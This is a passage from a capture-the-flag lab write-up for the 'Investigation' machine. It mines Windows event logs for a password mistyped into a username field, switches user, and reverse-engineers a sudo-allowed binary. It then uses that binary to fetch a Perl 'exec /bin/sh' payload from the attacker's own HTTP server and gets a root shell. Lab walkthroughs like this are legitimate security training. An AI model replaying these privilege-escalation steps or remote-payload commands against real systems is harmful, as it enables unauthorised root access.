+<span class="mtk1">    &lt;</span><span class="mtk5">Data</span><span class="mtk1"> </span><span class="mtk8">Name</span><span class="mtk1">=</span><span class="mtk4">"SubjectLogonId"</span><span class="mtk1">&gt;0x00000000000003e7&lt;/</span><span class="mtk5">Data</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Data</span><span class="mtk1"> </span><span class="mtk8">Name</span><span class="mtk1">=</span><span class="mtk4">"TargetUserSid"</span><span class="mtk1">&gt;S-1-5-96-0-3&lt;/</span><span class="mtk5">Data</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Data</span><span class="mtk1"> </span><span class="mtk8">Name</span><span class="mtk1">=</span><span class="mtk4">"TargetUserName"</span><span class="mtk1">&gt;UMFD-3&lt;/</span><span class="mtk5">Data</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Data</span><span class="mtk1"> </span><span class="mtk8">Name</span><span class="mtk1">=</span><span class="mtk4">"TargetDomainName"</span><span class="mtk1">&gt;Font Driver Host&lt;/</span><span class="mtk5">Data</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Data</span><span class="mtk1"> </span><span class="mtk8">Name</span><span class="mtk1">=</span><span class="mtk4">"TargetLogonId"</span><span class="mtk1">&gt;0x00000000002bff71&lt;/</span><span class="mtk5">Data</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Data</span><span class="mtk1"> </span><span class="mtk8">Name</span><span class="mtk1">=</span><span class="mtk4">"LogonType"</span><span class="mtk1">&gt;2&lt;/</span><span class="mtk5">Data</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Data</span><span class="mtk1"> </span><span class="mtk8">Name</span><span class="mtk1">=</span><span class="mtk4">"LogonProcessName"</span><span class="mtk1">&gt;Advapi &lt;/</span><span class="mtk5">Data</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Data</span><span class="mtk1"> </span><span class="mtk8">Name</span><span class="mtk1">=</span><span class="mtk4">"AuthenticationPackageName"</span><span class="mtk1">&gt;Negotiate&lt;/</span><span class="mtk5">Data</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Data</span><span class="mtk1"> </span><span class="mtk8">Name</span><span class="mtk1">=</span><span class="mtk4">"WorkstationName"</span><span class="mtk1">&gt;-&lt;/</span><span class="mtk5">Data</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Data</span><span class="mtk1"> </span><span class="mtk8">Name</span><span class="mtk1">=</span><span class="mtk4">"LogonGuid"</span><span class="mtk1">&gt;{00000000-0000-0000-0000-000000000000}&lt;/</span><span class="mtk5">Data</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Data</span><span class="mtk1"> </span><span class="mtk8">Name</span><span class="mtk1">=</span><span class="mtk4">"TransmittedServices"</span><span class="mtk1">&gt;-&lt;/</span><span class="mtk5">Data</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Data</span><span class="mtk1"> </span><span class="mtk8">Name</span><span class="mtk1">=</span><span class="mtk4">"LmPackageName"</span><span class="mtk1">&gt;-&lt;/</span><span class="mtk5">Data</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Data</span><span class="mtk1"> </span><span class="mtk8">Name</span><span class="mtk1">=</span><span class="mtk4">"KeyLength"</span><span class="mtk1">&gt;0&lt;/</span><span class="mtk5">Data</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Data</span><span class="mtk1"> </span><span class="mtk8">Name</span><span class="mtk1">=</span><span class="mtk4">"ProcessId"</span><span class="mtk1">&gt;0x00000000000010f0&lt;/</span><span class="mtk5">Data</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Data</span><span class="mtk1"> </span><span class="mtk8">Name</span><span class="mtk1">=</span><span class="mtk4">"ProcessName"</span><span class="mtk1">&gt;C:\Windows\System32\winlogon.exe&lt;/</span><span class="mtk5">Data</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Data</span><span class="mtk1"> </span><span class="mtk8">Name</span><span class="mtk1">=</span><span class="mtk4">"IpAddress"</span><span class="mtk1">&gt;-&lt;/</span><span class="mtk5">Data</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Data</span><span class="mtk1"> </span><span class="mtk8">Name</span><span class="mtk1">=</span><span class="mtk4">"IpPort"</span><span class="mtk1">&gt;-&lt;/</span><span class="mtk5">Data</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Data</span><span class="mtk1"> </span><span class="mtk8">Name</span><span class="mtk1">=</span><span class="mtk4">"ImpersonationLevel"</span><span class="mtk1">&gt;%%1833&lt;/</span><span class="mtk5">Data</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Data</span><span class="mtk1"> </span><span class="mtk8">Name</span><span class="mtk1">=</span><span class="mtk4">"RestrictedAdminMode"</span><span class="mtk1">&gt;-&lt;/</span><span class="mtk5">Data</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Data</span><span class="mtk1"> </span><span class="mtk8">Name</span><span class="mtk1">=</span><span class="mtk4">"TargetOutboundUserName"</span><span class="mtk1">&gt;-&lt;/</span><span class="mtk5">Data</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Data</span><span class="mtk1"> </span><span class="mtk8">Name</span><span class="mtk1">=</span><span class="mtk4">"TargetOutboundDomainName"</span><span class="mtk1">&gt;-&lt;/</span><span class="mtk5">Data</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Data</span><span class="mtk1"> </span><span class="mtk8">Name</span><span class="mtk1">=</span><span class="mtk4">"VirtualAccount"</span><span class="mtk1">&gt;%%1842&lt;/</span><span class="mtk5">Data</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Data</span><span class="mtk1"> </span><span class="mtk8">Name</span><span class="mtk1">=</span><span class="mtk4">"TargetLinkedLogonId"</span><span class="mtk1">&gt;0x0000000000000000&lt;/</span><span class="mtk5">Data</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">Data</span><span class="mtk1"> </span><span class="mtk8">Name</span><span class="mtk1">=</span><span class="mtk4">"ElevatedToken"</span><span class="mtk1">&gt;%%1843&lt;/</span><span class="mtk5">Data</span><span class="mtk1">&gt;</span>
+<span class="mtk1">  &lt;/</span><span class="mtk5">EventData</span><span class="mtk1">&gt;</span>
+<span class="mtk1">&lt;/</span><span class="mtk5">Event</span><span class="mtk1">&gt;</span>
+</code></pre></div><p>We might look for logs with Event ID (EID) 4624, which correspond to logon events on the system. However, we are interested in switching to user <code>smorton</code>, so maybe we need to find a plaintext password.</p><p>To start analyzing, let&rsquo;s filter by <code>UserName</code> and we will take the value:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">evtx_dump.py</span> <span class="mtku">security.evtx</span> | <span class="code-dark-green">grep</span> UserName | <span class="code-dark-green">head</span>
+&lt;SubjectUserName&gt;SMorton&lt;/SubjectUserName&gt;
+&lt;Data Name="SubjectUserName"&gt;SMorton&lt;/Data&gt;
+&lt;Data Name="SubjectUserName"&gt;SMorton&lt;/Data&gt;
+&lt;Data Name="SubjectUserName"&gt;SMorton&lt;/Data&gt;
+&lt;Data Name="SubjectUserName"&gt;SMorton&lt;/Data&gt;
+&lt;Data Name="SubjectUserName"&gt;SMorton&lt;/Data&gt;
+&lt;Data Name="SubjectUserName"&gt;SMorton&lt;/Data&gt;
+&lt;Data Name="SubjectUserName"&gt;SMorton&lt;/Data&gt;
+&lt;Data Name="SubjectUserName"&gt;SMorton&lt;/Data&gt;
+&lt;Data Name="SubjectUserName"&gt;SMorton&lt;/Data&gt;
+
+<span class="code-cyan">$</span> <span class="code-dark-green">evtx_dump.py</span> <span class="mtku">security.evtx</span> | <span class="code-dark-green">grep</span> UserName | <span class="code-dark-green">grep</span> -oE <span class="code-dark-yellow">'"&gt;.*?&lt;'</span> | <span class="code-dark-green">tr</span> -d <span class="code-dark-yellow">'"&lt;&gt;'</span> | <span class="code-dark-green">head</span>
+SMorton
+SMorton
+SMorton
+SMorton
+SMorton
+SMorton
+SMorton
+SMorton
+SMorton
+SMorton
+
+<span class="code-cyan">$</span> <span class="code-dark-green">evtx_dump.py</span> <span class="mtku">security.evtx</span> | <span class="code-dark-green">grep</span> UserName | <span class="code-dark-green">grep</span> -oE <span class="code-dark-yellow">'"&gt;.*?&lt;'</span> | <span class="code-dark-green">tr</span> -d <span class="code-dark-yellow">'"&lt;&gt;'</span> | <span class="code-dark-green">sort</span> -u  
+-
+AAnderson
+AWright
+Administrator
+Administrators
+BMay
+Backup Operators
+DWM-1
+DWM-2
+DWM-3
+DWM-4
+DWM-5
+DWM-6
+DWM-7
+DWM-8
+DWM-9
+Def@ultf0r3nz!csPa$$
+DefaultAccount
+EFORENZICS-DI$
+EKora
+Guest
+HMarley
+IPerez
+JClark
+KTyson
+LJenkins
+LMonroe
+LOCAL SERVICE
+NT AUTHORITY\LOCAL SERVICE
+SMorton
+SYSTEM
+UMFD-1
+UMFD-2
+UMFD-3
+UMFD-4
+UMFD-5
+UMFD-6
+UMFD-7
+UMFD-8
+UMFD-9
+WDAGUtilityAccount
+aanderson
+hmarley
+hmraley
+ljenkins
+lmonroe
+smorton
+</code></pre></div><p>There&rsquo;s one value that stands out: <code>Def@ultf0r3nz!csPa$$</code>. Actually, it is the password for <code>smorton</code>, he must have entered his password in the user field by mistake.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@investigation:/usr/local/investigation$ su smorton  
+Password:
+smorton@investigation:/usr/local/investigation$ cd
+smorton@investigation:~$ cat user.txt
+8dbb657710ef05add24c6b3469d74c24
+</code></pre></div><h2 id="privilege-escalation">Privilege escalation</h2><p>This user is able to run an ELF binary called <code>/usr/bin/binary</code> as <code>root</code> using <code>sudo</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">smorton@investigation:~$ sudo -l
+Matching Defaults entries for smorton on investigation:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User smorton may run the following commands on investigation:
+    (root) NOPASSWD: /usr/bin/binary
+smorton@investigation:~$ file /usr/bin/binary
+/usr/bin/binary: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a703575c5c  
+944bfcfea8a04f0aabaf0b4fa9f7cb, for GNU/Linux 3.2.0, not stripped
+</code></pre></div><p>Let&rsquo;s transfer the binary file to our machine:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">smorton@investigation:~$ cd /usr/bin
+smorton@investigation:/usr/bin$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...  
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">wget</span> -q 10.10.11.197:8000/binary
+
+<span class="code-cyan">$</span> <span class="code-dark-green">file</span> <span class="mtku">binary</span>
+binary: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=a703575c5c944bfcfe  
+a8a04f0aabaf0b4fa9f7cb, for GNU/Linux 3.2.0, not stripped
+</code></pre></div><h3 id="reverse-engineering">Reverse engineering</h3><p>If we load the binary in Ghidra, we will see the following decompiled <code>main</code> function in C:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">argc</span><span class="mtk1">, </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">**</span><span class="mtk9 mtki">argv</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">__uid_t</span><span class="mtk1"> uid;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> ret;</span>
+<span class="mtk1">  FILE </span><span class="mtk5">*</span><span class="mtk1">__stream;</span>
+<span class="mtk1">  undefined8 handle;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">__s;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">__s_00;</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (argc </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">3</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Exiting... "</span><span class="mtk1">);</span>
+<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>  
+<span class="mtk1">    </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  uid </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">getuid</span><span class="mtk1">();</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (uid </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Exiting... "</span><span class="mtk1">);</span>
+<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
+<span class="mtk1">    </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  ret </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">strcmp</span><span class="mtk1">(argv[</span><span class="mtk6">2</span><span class="mtk1">], </span><span class="mtk4">"lDnxUysaQn"</span><span class="mtk1">);</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (ret </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Exiting... "</span><span class="mtk1">);</span>
+<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
+<span class="mtk1">    </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Running... "</span><span class="mtk1">);</span>
+<span class="mtk1">  __stream </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">fopen</span><span class="mtk1">(argv[</span><span class="mtk6">2</span><span class="mtk1">], </span><span class="mtk4">"wb"</span><span class="mtk1">);</span>
+<span class="mtk1">  handle </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">curl_easy_init</span><span class="mtk1">();</span>
+<span class="mtk1">  </span><span class="mtk8">curl_easy_setopt</span><span class="mtk1">(handle, </span><span class="mtk5">0x</span><span class="mtk6">2712</span><span class="mtk1">, argv[</span><span class="mtk6">1</span><span class="mtk1">]);</span>
+<span class="mtk1">  </span><span class="mtk8">curl_easy_setopt</span><span class="mtk1">(handle, </span><span class="mtk5">0x</span><span class="mtk6">2711</span><span class="mtk1">, __stream);</span>
+<span class="mtk1">  </span><span class="mtk8">curl_easy_setopt</span><span class="mtk1">(handle, </span><span class="mtk5">0x</span><span class="mtk6">2d</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">);</span>
+<span class="mtk1">  ret </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">curl_easy_perform</span><span class="mtk1">(handle);</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (ret </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">    ret </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">snprintf</span><span class="mtk1">(</span><span class="mtk6">NULL</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk4">"</span><span class="mtk6">%s</span><span class="mtk4">"</span><span class="mtk1">, argv[</span><span class="mtk6">2</span><span class="mtk1">]);</span>
+<span class="mtk1">    __s </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk8">malloc</span><span class="mtk1">((</span><span class="mtk7 mtki">long</span><span class="mtk1">) ret </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk8">snprintf</span><span class="mtk1">(__s, (</span><span class="mtk7 mtki">long</span><span class="mtk1">) ret </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk4">"</span><span class="mtk6">%s</span><span class="mtk4">"</span><span class="mtk1">, argv[</span><span class="mtk6">2</span><span class="mtk1">]);</span>
+<span class="mtk1">    ret </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">snprintf</span><span class="mtk1">(</span><span class="mtk6">NULL</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk4">"perl ./</span><span class="mtk6">%s</span><span class="mtk4">"</span><span class="mtk1">, __s);</span>
+<span class="mtk1">    __s_00 </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk8">malloc</span><span class="mtk1">((</span><span class="mtk7 mtki">long</span><span class="mtk1">) ret </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk8">snprintf</span><span class="mtk1">(__s_00, (</span><span class="mtk7 mtki">long</span><span class="mtk1">) ret </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk4">"perl ./</span><span class="mtk6">%s</span><span class="mtk4">"</span><span class="mtk1">, __s);</span>
+<span class="mtk1">    </span><span class="mtk8">fclose</span><span class="mtk1">(__stream);</span>
+<span class="mtk1">    </span><span class="mtk8">curl_easy_cleanup</span><span class="mtk1">(handle);</span>
+<span class="mtk1">    </span><span class="mtk8">setuid</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk8">system</span><span class="mtk1">(__s_00);</span>
+<span class="mtk1">    </span><span class="mtk8">system</span><span class="mtk1">(</span><span class="mtk4">"rm -f ./lDnxUysaQn"</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Exiting... "</span><span class="mtk1">);</span>
+<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
+<span class="mtk1">  </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>First of all, we need to use two command line arguments, and the second one must be <code>lDnxUysaQn</code> (<code>argv[2]</code>). After that, the binary will use <code>curl</code> to download some payload that will be written to <code>./lDnxUysaQn</code> and executed with <code>perl</code>. The URL is taken from the first command line argument (<code>argv[1]</code>).</p><p>Therefore, we have somehow the chance to run <code>perl</code> with <code>sudo</code>. Using my tool <a href="https://github.com/7Rocky/gtfobins-cli"><code>gtfobins-cli</code></a> we can find the code to obtain a shell as <code>root</code> using <code>perl</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gtfobins-cli</span> --sudo perl
+
+<span class="code-bg-green code-black">perl</span> ==&gt; <span class="code-yellow">https://gtfobins.github.io/gtfobins/perl/</span>
+
+
+<span class="code-red mtku">Sudo</span>
+
+If the binary is allowed to run as superuser by <span class="code-cyan">sudo</span>, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.  
+
+<span class="code-cyan">sudo perl -e 'exec "/bin/sh";'</span>
+</code></pre></div><p>Now, we create a file named <code>script.pl</code> with the above Perl code and start an HTTP server:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> <span class="code-dark-yellow">'exec "/bin/sh";'</span> &gt; script.pl
+
+<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -m http.server 80
+Serving HTTP on :: port 80 (http://[::]:80/) ...  
+</code></pre></div><p>On the machine, we enter the URL of the Perl script as first argument and run the binary. When the Perl script is executed, we will have a shell as <code>root</code>, so we can read the <code>root.txt</code> flag:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">smorton@investigation:/usr/bin$ sudo /usr/bin/binary http://10.10.17.44/script.pl lDnxUysaQn  
+Running...
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# bash
+root@investigation:/usr/bin# cd
+root@investigation:~# cat root.txt
+1453ecf0772f9cfd2b9c22b46790c3e6
+</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#enumeration">Enumeration</a></li><li><a href="#foothold">Foothold</a></li><li><a href="#system-enumeration">System enumeration</a><ul><li><a href="#extracting-windows-outlook-messages">Extracting Windows Outlook messages</a></li><li><a href="#analyzing-windows-event-logs">Analyzing Windows event logs</a></li></ul></li><li><a href="#privilege-escalation">Privilege escalation</a><ul><li><a href="#reverse-engineering">Reverse engineering</a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Receive a weekly blog digest</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Enter your email address" name="email" id="tlemail">
+<input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Submit"></p><input type="hidden" value="1" name="embed">
+<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc">powered by <a href="https://tinyletter.com" target="_blank" title="TinyLetter">TinyLetter</a></p><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>
